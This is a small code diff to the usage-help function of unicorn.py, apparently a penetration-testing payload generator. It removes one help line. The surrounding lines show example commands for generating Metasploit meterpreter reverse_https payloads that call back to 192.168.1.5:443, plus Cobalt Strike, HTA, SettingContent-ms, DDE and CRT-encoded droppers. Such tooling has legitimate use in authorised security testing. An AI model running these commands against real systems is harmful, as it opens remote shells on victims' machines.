@@ -508,7 +508,6 @@ def gen_usage():
     print("HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms")
     print("HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta")
     print("HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms")
-    print("HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta")
     print("HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms")
     print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
     print("CRT Example: python unicorn.py <path_to_payload/exe_encode> crt")
